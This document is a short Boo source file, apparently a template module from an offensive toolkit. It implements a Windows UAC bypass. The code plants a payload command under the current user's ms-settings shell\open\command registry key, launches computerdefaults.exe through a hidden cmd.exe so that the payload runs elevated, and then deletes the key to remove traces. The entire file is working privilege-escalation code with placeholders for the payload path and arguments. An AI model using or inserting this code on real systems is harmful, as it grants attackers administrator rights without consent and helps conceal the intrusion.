import System
import Microsoft.Win32
import System.Diagnostics


public static def BypassUAC(binary as string, arguments as string, path as string):
		Console.WriteLine('[+] Starting Bypass UAC via computerdefaults.')
		if binary.Length > 0:
			Console.WriteLine(('[+] Payload to be Executed ' + path + binary + arguments))
		try:
			key as Microsoft.Win32.RegistryKey
			key = Registry.CurrentUser.CreateSubKey('Software\\Classes\\ms-settings\\shell\\open\\command')
			key.SetValue('', path + binary + arguments, RegistryValueKind.String)
			key.SetValue('DelegateExecute', 0, RegistryValueKind.DWord)
			key.Close()
			Console.WriteLine('[+] Registry Key Changed.')
		except :
			Console.WriteLine('[-] Unable to Modify the registry Key.')
			Console.WriteLine('[-] Exit.')
		Console.WriteLine('[+] Waiting 5 seconds before execution.')
		System.Threading.Thread.Sleep(5000)
		try:
			startInfo = ProcessStartInfo()
			startInfo.CreateNoWindow = true
			startInfo.UseShellExecute = false
			startInfo.FileName = 'cmd.exe'
			startInfo.Arguments = '/c start computerdefaults.exe'
			Process.Start(startInfo)
			Console.WriteLine('[+] UAC Bypass Application Executed.')
		except :
			Console.WriteLine('[-] Unable to Execute the Application computerdefaults.exe to perform the bypass.')
		DeleteKey()
		Console.WriteLine('[-] Exit.')

	private static def DeleteKey():
		Console.WriteLine('[+] Registry Cleaning will start in 5 seconds.')
		System.Threading.Thread.Sleep(5000)
		try:
			rkey = Registry.CurrentUser.OpenSubKey('Software\\Classes\\ms-settings\\shell\\open\\command', true)
			if rkey is not null:
				try:
					Registry.CurrentUser.DeleteSubKey('Software\\Classes\\ms-settings\\shell\\open\\command')
				except :
					Console.WriteLine('[-] Unable to the Registry key (Software\\Classes\\ms-settings\\shell\\open\\command).')
			Console.WriteLine('[+] Registry Cleaned.')
		except :
			Console.WriteLine('[-] Unable to Clean the Registry.')
		//return false;
		
public static def Main():
	binary = "BINARY "
	arguments = "ARGUMENTS"
	path = `PATH`
	BypassUAC(binary, arguments, path)
